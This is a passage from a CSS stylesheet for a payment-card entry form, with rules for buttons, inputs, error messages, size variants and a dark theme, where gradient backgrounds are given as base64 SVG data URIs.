	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2JhYmFiZCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNkZGRkZTAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #bababd;
	background-image: -webkit-linear-gradient(top, #bababd, #dddde0);
	background-image: -o-linear-gradient(top, #bababd 0, #dddde0 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#bababd), to(#dddde0));
	background-image: linear-gradient(180deg, #bababd 0, #dddde0)
}

.credit-card-form__popup-footer .button:focus,
.pay-card-layout_type_dc .credit-card-form__popup .button:focus,
.pay-card-layout_type_zz .credit-card-form__popup .button:focus {
	-webkit-box-shadow: 0 0 5px #81c8ff;
	box-shadow: 0 0 5px #81c8ff
}

.credit-card-form__popup-footer .button_disabled_yes,
.pay-card-layout_type_dc .credit-card-form__popup .button_disabled_yes,
.pay-card-layout_type_zz .credit-card-form__popup .button_disabled_yes {
	color: #999;
	cursor: default;
	text-shadow: none;
	-webkit-box-shadow: none;
	box-shadow: none
}

.credit-card-form__popup-footer .button_disabled_yes,
.credit-card-form__popup-footer .button_disabled_yes:active,
.credit-card-form__popup-footer .button_disabled_yes:hover,
.pay-card-layout_type_dc .credit-card-form__popup .button_disabled_yes,
.pay-card-layout_type_dc .credit-card-form__popup .button_disabled_yes:active,
.pay-card-layout_type_dc .credit-card-form__popup .button_disabled_yes:hover,
.pay-card-layout_type_zz .credit-card-form__popup .button_disabled_yes,
.pay-card-layout_type_zz .credit-card-form__popup .button_disabled_yes:active,
.pay-card-layout_type_zz .credit-card-form__popup .button_disabled_yes:hover {
	border-color: #dcdcdc;
	background-color: #dddde0;
	background-image: -webkit-linear-gradient(top, #dddde0, #ccc);
	background-image: -o-linear-gradient(top, #dddde0 0, #ccc 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#dddde0), to(#ccc));
	background-image: linear-gradient(180deg, #dddde0 0, #ccc)
}

.credit-card-form__popup-footer .button_disabled_yes:active,
.credit-card-form__popup-footer .button_disabled_yes:hover,
.pay-card-layout_type_dc .credit-card-form__popup .button_disabled_yes:active,
.pay-card-layout_type_dc .credit-card-form__popup .button_disabled_yes:hover,
.pay-card-layout_type_zz .credit-card-form__popup .button_disabled_yes:active,
.pay-card-layout_type_zz .credit-card-form__popup .button_disabled_yes:hover {
	-webkit-box-shadow: none;
	box-shadow: none
}

.credit-card-form .payment-systems-icons {
	position: relative;
	top: -22px
}

.credit-card-form .payment-systems-icon {
	position: relative;
	margin: 0 0 -6px 6px;
	float: right;
	display: inline-block
}

.credit-card-form .payment-systems-icon_disabled_yes {
	opacity: .3
}

.credit-card-form .payment-systems-icon_name_mir,
.credit-card-form .payment-systems-icon_name_visa {
	top: 6px
}

.credit-card-form .credit-card-form__submit .button {
	color: #fff;
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmNWUwMCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmOTMxMDAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #ff5e00;
	background-image: -webkit-linear-gradient(top, #ff5e00, #f93100);
	background-image: -o-linear-gradient(top, #ff5e00 0, #f93100 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#ff5e00), to(#f93100));
	background-image: linear-gradient(180deg, #ff5e00 0, #f93100);
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.credit-card-form .credit-card-form__submit .button:hover {
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmNmUwMCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmNDFkMDAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #ff6e00;
	background-image: -webkit-linear-gradient(top, #ff6e00, #f41d00);
	background-image: -o-linear-gradient(top, #ff6e00 0, #f41d00 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#ff6e00), to(#f41d00));
	background-image: linear-gradient(180deg, #ff6e00 0, #f41d00)
}

.credit-card-form .credit-card-form__submit .button:active {
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2Y5MzAwMCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmZjVkMDAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background: -webkit-gradient(linear, left top, left bottom, from(#f93000), to(#ff5d00));
	background: -webkit-linear-gradient(top, #f93000, #ff5d00);
	background: -o-linear-gradient(top, #f93000 0, #ff5d00 100%);
	background: linear-gradient(180deg, #f93000 0, #ff5d00)
}

.credit-card-form .credit-card-form__submit .button:focus {
	-webkit-box-shadow: 0 0 5px #81c8ff;
	box-shadow: 0 0 5px #81c8ff
}

.credit-card-form .credit-card-form__submit .button_disabled_yes {
	color: #999;
	cursor: default;
	text-shadow: none;
	-webkit-box-shadow: none;
	box-shadow: none
}

.credit-card-form .credit-card-form__submit .button_disabled_yes,
.credit-card-form .credit-card-form__submit .button_disabled_yes:active,
.credit-card-form .credit-card-form__submit .button_disabled_yes:hover {
	border-color: #dcdcdc;
	background-color: #dddde0;
	background-image: -webkit-linear-gradient(top, #dddde0, #ccc);
	background-image: -o-linear-gradient(top, #dddde0 0, #ccc 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#dddde0), to(#ccc));
	background-image: linear-gradient(180deg, #dddde0 0, #ccc)
}

.credit-card-form .credit-card-form__submit .button_disabled_yes:active,
.credit-card-form .credit-card-form__submit .button_disabled_yes:hover {
	-webkit-box-shadow: none;
	box-shadow: none
}

.credit-card-form_layout_horizontal .credit-card-form__submit {
	position: absolute;
	left: 420px;
	bottom: 0
}

.credit-card-form_layout_horizontal .credit-card-form__popup {
	bottom: -2px
}

.credit-card-form_type_fotostrana .credit-card-form__popup-footer .button,
.credit-card-form_type_fotostrana .credit-card-form__submit .button {
	font-size: 14px;
	font-family: Tahoma;
	padding: 3px 43px;
	min-width: 69px;
	line-height: 36px;
	height: auto
}

.credit-card-form_type_fotostrana .credit-card-form__popup-footer .button {
	color: #333;
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2RlZGVlMSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNiYmJiYmUiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #dedee1;
	background-image: -webkit-linear-gradient(top, #dedee1, #bbbbbe);
	background-image: -o-linear-gradient(top, #dedee1 0, #bbbbbe 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#dedee1), to(#bbbbbe));
	background-image: linear-gradient(180deg, #dedee1 0, #bbbbbe);
	border: 1px solid #dcdcdc
}

.credit-card-form_type_fotostrana .credit-card-form__popup-footer .button:hover {
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2U5ZTllYiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNjMWMxYzMiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #e9e9eb;
	background-image: -webkit-linear-gradient(top, #e9e9eb, #c1c1c3);
	background-image: -o-linear-gradient(top, #e9e9eb 0, #c1c1c3 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#e9e9eb), to(#c1c1c3));
	background-image: linear-gradient(180deg, #e9e9eb 0, #c1c1c3)
}

.credit-card-form_type_fotostrana .credit-card-form__popup-footer .button:active {
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2JhYmFiZCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNkZGRkZTAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #bababd;
	background-image: -webkit-linear-gradient(top, #bababd, #dddde0);
	background-image: -o-linear-gradient(top, #bababd 0, #dddde0 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#bababd), to(#dddde0));
	background-image: linear-gradient(180deg, #bababd 0, #dddde0)
}

.credit-card-form_type_fotostrana .credit-card-form__submit .button {
	color: #fff;
	border: 1px solid #0076a9;
	background: #0091d0;
	-webkit-box-shadow: inset 0 0 0 1px hsla(0, 0%, 100%, .2);
	box-shadow: inset 0 0 0 1px hsla(0, 0%, 100%, .2);
	background-color: #0091d0;
	background-image: -webkit-linear-gradient(top, #0091d0, #0085bf);
	background-image: -o-linear-gradient(top, #0091d0 0, #0085bf 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#0091d0), to(#0085bf));
	background-image: linear-gradient(180deg, #0091d0 0, #0085bf)
}

.credit-card-form_type_fotostrana .credit-card-form__submit .button:hover {
	border-color: #0088c4;
	background: #18a5e3;
	background-color: #18a5e3;
	background-image: -webkit-linear-gradient(top, #18a5e3, #1492ca);
	background-image: -o-linear-gradient(top, #18a5e3 0, #1492ca 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#18a5e3), to(#1492ca));
	background-image: linear-gradient(180deg, #18a5e3 0, #1492ca)
}

.credit-card-form_type_fotostrana .credit-card-form__submit .button:active {
	border-color: #0088c4;
	background: #0085bf;
	background-color: #0085bf;
	background-image: -webkit-linear-gradient(top, #0085bf, #0091d0);
	background-image: -o-linear-gradient(top, #0085bf 0, #0091d0 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#0085bf), to(#0091d0));
	background-image: linear-gradient(180deg, #0085bf 0, #0091d0)
}

.credit-card-form_type_fotostrana .credit-card-form__submit .button_disabled_yes {
	color: #999;
	cursor: default;
	text-shadow: none;
	-webkit-box-shadow: none;
	box-shadow: none
}

.credit-card-form_type_fotostrana .credit-card-form__submit .button_disabled_yes,
.credit-card-form_type_fotostrana .credit-card-form__submit .button_disabled_yes:active,
.credit-card-form_type_fotostrana .credit-card-form__submit .button_disabled_yes:hover {
	border-color: #dcdcdc;
	background-color: #dddde0;
	background-image: -webkit-linear-gradient(top, #dddde0, #ccc);
	background-image: -o-linear-gradient(top, #dddde0 0, #ccc 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#dddde0), to(#ccc));
	background-image: linear-gradient(180deg, #dddde0 0, #ccc)
}

.credit-card-form_type_fotostrana .credit-card-form__submit .button_disabled_yes:active,
.credit-card-form_type_fotostrana .credit-card-form__submit .button_disabled_yes:hover {
	-webkit-box-shadow: none;
	box-shadow: none
}

.credit-card-form_type_fotostrana .waiter-icon {
	display: none
}

.credit-card-form_size_small,
.credit-card-form_size_x-small {
	text-align: left;
	padding-bottom: 10px
}

.credit-card-form_size_small .credit-card-form__card,
.credit-card-form_size_x-small .credit-card-form__card {
	background: #f0f0f0;
	width: 250px;
	height: 130px;
	padding-right: 20px;
	padding-left: 20px
}

.credit-card-form_size_small .credit-card-form__card_position_front,
.credit-card-form_size_x-small .credit-card-form__card_position_front {
	padding-top: 50px
}

.credit-card-form_size_small .credit-card-form__form,
.credit-card-form_size_x-small .credit-card-form__form {
	margin: 0 auto;
	padding-top: 35px
}

.credit-card-form_size_small .credit-card-form__submit,
.credit-card-form_size_x-small .credit-card-form__submit {
	margin-top: 10px
}

.credit-card-form_size_small .credit-card-form__label-group_type_add-card .credit-card-form__label,
.credit-card-form_size_x-small .credit-card-form__label-group_type_add-card .credit-card-form__label {
	position: relative;
	display: inline-block;
	color: #333
}

.credit-card-form_size_small .credit-card-form__label-group_type_add-card .credit-card-form__input,
.credit-card-form_size_x-small .credit-card-form__label-group_type_add-card .credit-card-form__input {
	height: 13px;
	line-height: 13px;
	margin-right: 7px;
	border: none
}

.credit-card-form_size_small .credit-card-form__label-group_type_add-card .credit-card-form__input:focus,
.credit-card-form_size_x-small .credit-card-form__label-group_type_add-card .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.credit-card-form_size_small .credit-card-form__title_type_expiration-date,
.credit-card-form_size_x-small .credit-card-form__title_type_expiration-date {
	top: 138px
}

.credit-card-form_size_small .credit-card-form__input,
.credit-card-form_size_x-small .credit-card-form__input {
	background: #fff;
	border: 1px solid #b5b5b5
}

.credit-card-form_size_small .credit-card-form__input:disabled,
.credit-card-form_size_x-small .credit-card-form__input:disabled {
	color: #b5b5b5;
	background: #f7f7f7
}

.credit-card-form_size_small .credit-card-form__card_position_back,
.credit-card-form_size_x-small .credit-card-form__card_position_back {
	margin: -235px 0;
	padding-top: 20px;
	height: 150px;
	right: -110px
}

.credit-card-form_size_small .credit-card-form__title,
.credit-card-form_size_x-small .credit-card-form__title {
	color: #333
}

.credit-card-form_size_small .credit-card-form__card_position_back:before,
.credit-card-form_size_x-small .credit-card-form__card_position_back:before {
	margin: 0 -20px 25px
}

.credit-card-form_size_small .credit-card-form__label-group_type_cvv .credit-card-form__error-text,
.credit-card-form_size_x-small .credit-card-form__label-group_type_cvv .credit-card-form__error-text {
	display: block;
	margin-left: 0;
	width: 70px
}

.credit-card-form_size_small .credit-card-form__label-group_type_expiration-date .credit-card-form__error-text,
.credit-card-form_size_x-small .credit-card-form__label-group_type_expiration-date .credit-card-form__error-text {
	margin-left: 6px
}

.credit-card-form_size_small .credit-card-form__error-text,
.credit-card-form_size_x-small .credit-card-form__error-text {
	margin-top: 4px;
	line-height: 13px;
	color: #888
}

.credit-card-form_size_small .credit-card-form__label_error_yes .credit-card-form__error-text,
.credit-card-form_size_x-small .credit-card-form__label_error_yes .credit-card-form__error-text {
	color: #f33
}

.credit-card-form_size_small .credit-card-form__label_error_yes .credit-card-form__input,
.credit-card-form_size_x-small .credit-card-form__label_error_yes .credit-card-form__input {
	outline-width: 1px
}

.credit-card-form_size_small .credit-card-form__cvv-icon,
.credit-card-form_size_x-small .credit-card-form__cvv-icon {
	display: none
}

.credit-card-form_size_small .credit-card-form__tooltip,
.credit-card-form_size_x-small .credit-card-form__tooltip {
	padding: 10px 15px;
	background: #fff;
	line-height: 16px;
	-webkit-box-shadow: 0 0 10px rgba(0, 0, 0, .2);
	box-shadow: 0 0 10px rgba(0, 0, 0, .2)
}

.card-to-card__terms,
.credit-card-form_size_small .credit-card-form__terms,
.credit-card-form_size_x-small .credit-card-form__terms {
	font-size: 11px;
	padding-top: 15px;
	color: #888;
	-webkit-text-size-adjust: none;
	text-size-adjust: none
}

.card-to-card__terms-link,
.credit-card-form_size_small .credit-card-form__terms-link,
.credit-card-form_size_x-small .credit-card-form__terms-link {
	color: #888;
	text-decoration: underline
}

.credit-card-form_size_small .payment-systems-icon,
.credit-card-form_size_x-small .payment-systems-icon {
	margin-left: 4px
}

.credit-card-form_size_x-small .credit-card-form__form {
	padding-top: 15px
}

.credit-card-form_size_x-small .credit-card-form__card {
	width: 235px;
	margin-bottom: 0;
	padding: 25px 15px 0
}

.credit-card-form_size_x-small .credit-card-form__card_position_back {
	height: 140px;
	margin-top: -165px;
	padding-top: 15px
}

.credit-card-form_size_x-small .credit-card-form__card_position_back:before {
	height: 30px;
	margin: 0 -15px 15px
}

.credit-card-form_size_x-small .credit-card-form__title {
	font-size: 11px
}

.credit-card-form_size_x-small .credit-card-form__label-group_type_card-number {
	margin-bottom: 15px
}

.credit-card-form_size_x-small .credit-card-form__label-group_type_card-number .credit-card-form__title,
.credit-card-form_size_x-small .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-bottom: 3px
}

.credit-card-form_size_x-small .credit-card-form__title_type_expiration-date {
	top: 110px;
	left: 10px
}

.credit-card-form_size_x-small .credit-card-form__input {
	padding-left: 7px;
	letter-spacing: 1px
}

.credit-card-form_size_x-small .credit-card-form__label-group_type_add-card .credit-card-form__input {
	padding-left: 0;
	border: none
}

.credit-card-form_size_x-small .credit-card-form__error-text {
	margin-top: 2px
}

.credit-card-form_size_x-small .credit-card-form__label-group_type_add-card {
	margin-top: 5px;
	margin-bottom: -5px
}

.credit-card-form_size_x-small .payment-systems-icons {
	top: -8px
}

.credit-card-form_size_x-small .payment-systems-icon_name_mir,
.credit-card-form_size_x-small .payment-systems-icon_name_visa {
	top: 4px
}

.credit-card-form_single-side_yes .credit-card-form__label-group_type_expiration-date {
	float: none;
	margin-left: -6px
}

.credit-card-form_single-side_yes .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	vertical-align: middle;
	float: left
}

.credit-card-form_single-side_yes .credit-card-form__label_type_cvv {
	width: 85px;
	white-space: nowrap
}

.credit-card-form_single-side_yes .credit-card-form__label_type_cvv .credit-card-form__error-text,
.credit-card-form_single-side_yes .credit-card-form__label_type_cvv .credit-card-form__input {
	display: inline-block
}

.credit-card-form_single-side_yes .credit-card-form__label_type_cvv .credit-card-form__error-text {
	width: 65px;
	margin-top: -5px;
	white-space: normal
}

.credit-card-form_expiration-date-visible_no .credit-card-form__label-group_type_expiration-date {
	visibility: hidden
}

.pay-card {
	text-align: center;
	position: relative
}

.pay-card__row,
.pay-card_type_cloud .credit-card-form__submit {
	padding-top: 10px
}

.pay-card__row_type-footer,
.pay-card_type_cloud .credit-card-form__submit {
	border-top: 1px solid #e6e6e6;
	padding: 20px 0;
	position: fixed;
	width: 100%;
	left: 0;
	bottom: 0
}

.pay-card__card {
	width: 410px;
	margin: 0 auto
}

.pay-card__card-selector {
	width: 410px;
	margin: 0 auto 10px;
	text-align: left
}

.pay-card__title {
	margin: 0 auto 10px;
	padding: 10px 0 0;
	text-align: center
}

.pay-card__remove-card,
.pay-card__select-card {
	display: inline-block;
	vertical-align: middle
}

.pay-card__remove-card {
	color: #999;
	cursor: pointer
}

.pay-card__remove-card-icon,
.pay-card__remove-card-text {
	vertical-align: middle
}

.pay-card__remove-card-icon {
	font-size: 20px;
	padding-right: 10px
}

.pay-card .credit-card-form {
	position: static
}

.pay-card .control {
	margin-right: 10px
}

.pay-card .control-label__text {
	line-height: 30px;
	margin-right: 10px;
	-webkit-text-size-adjust: 100%;
	text-size-adjust: 100%
}

.pay-card .control__select {
	border: 1px solid #dbdbdb;
	background: #f4f4f4;
	margin: 0;
	min-width: 140px;
	height: 30px;
	border-radius: 3px;
	font-size: 12px
}

.body_type_standard_theme_black {
	background-color: #1a1d2a
}

.pay-card-layout_type_standard_theme_black .credit-card-form__popup .button,
.pay-card-layout_type_standard_theme_black .credit-card-form__popup .info-block .paragraph,
.pay-card-layout_type_standard_theme_black .credit-card-form__popup .info-block .title,
.pay-card-layout_type_standard_theme_black .credit-card-form__submit .button,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_small .credit-card-form__input,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .credit-card-form__input,
.pay-card-layout_type_standard_theme_black .info-block .paragraph,
.pay-card-layout_type_standard_theme_black .notification-block .title,
.pay-card-layout_type_standard_theme_black .pay-card,
.pay-card-layout_type_standard_theme_black .pay-card__select-card .control__select,
.pay-card-layout_type_standard_theme_black .secure-information__text {
	font-family: Roboto, arial, helvetica
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_small .credit-card-form__card,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .credit-card-form__card {
	background: #2a2e3c
}

.pay-card-layout_type_standard_theme_black .credit-card-form__card_position_back:before {
	background: #212430
}

.pay-card-layout_type_standard_theme_black .pay-card .control-label__text {
	color: #f5f5f7
}

.pay-card-layout_type_standard_theme_black .pay-card__select-card .control__select {
	border-radius: 4px;
	border: 1px solid rgba(245, 245, 247, .2);
	background: hsla(0, 0%, 85%, .06);
	color: #f5f5f7;
	letter-spacing: .06px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout_type_standard_theme_black .pay-card .control__select:not(.selectBox) {
	padding-left: 12px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card-layout_type_standard_theme_black .control__select.selectBox-dropdown .selectBox-label {
	padding: 6px 12px
}

.pay-card-layout_type_standard_theme_black .selectBox-dropdown .selectBox-arrow,
.pay-card-layout_type_standard_theme_black .selectBox-dropdown:focus .selectBox-arrow {
	display: block;
	right: 6px;
	margin: 0;
	background: transparent;
	border: 4px solid transparent;
	border-top: 6px solid #f5f5f7;
	margin-top: -2px
}

.pay-card-layout_type_standard_theme_black .selectBox-dropdown.selectBox-menuShowing .selectBox-arrow {
	-webkit-transform: rotate(180deg) translateY(50%);
	-o-transform: rotate(180deg) translateY(50%);
	transform: rotate(180deg) translateY(50%)
}

.pay-card-layout_type_standard_theme_black .pay-card__remove-card {
	color: rgba(245, 245, 247, .6)
}

.pay-card-layout_type_standard_theme_black .pay-card__remove-card-icon,
.pay-card-layout_type_standard_theme_black .pay-card__remove-card-text {
	vertical-align: bottom
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_small .credit-card-form__title,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .credit-card-form__title {
	letter-spacing: .07px;
	color: #f5f5f7;
	text-transform: capitalize
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_small .credit-card-form__input,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .credit-card-form__input {
	border: 1px solid rgba(245, 245, 247, .2);
	background: hsla(0, 0%, 85%, .06);
	letter-spacing: .08px;
	color: rgba(245, 245, 247, .6);
	line-height: 21px;
	font-size: 15px;
	padding-left: 12px
}

.pay-card-layout_type_standard_theme_black .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	border: 1px solid #119bdb
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .credit-card-form__error-text {
	color: rgba(245, 245, 247, .6)
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_small .credit-card-form__label_error_yes .credit-card-form__error-text,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .credit-card-form__label_error_yes .credit-card-form__error-text {
	color: #d74242
}

.pay-card-layout_type_standard_theme_black .credit-card-form__label_error_yes .credit-card-form__input {
	outline: 1px solid #d74242
}

.pay-card-layout_type_standard_theme_black .card-to-card__terms,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_small .credit-card-form__terms,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .credit-card-form__terms {
	color: rgba(245, 245, 247, .6);
	line-height: 1.45;
	letter-spacing: .05px;
	padding-top: 10px
}

.pay-card-layout_type_standard_theme_black .credit-card-form .credit-card-form__submit .button,
.pay-card-layout_type_standard_theme_black .credit-card-form__popup .button {
	border-radius: 4px;
	background: #119bdb;
	color: #fff;
	letter-spacing: .2px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout_type_standard_theme_black .credit-card-form__popup .button.button_disabled_yes,
.pay-card-layout_type_standard_theme_black .credit-card-form__submit .button.button_disabled_yes {
	background: #2a2e3c;
	color: #9fa3a9
}

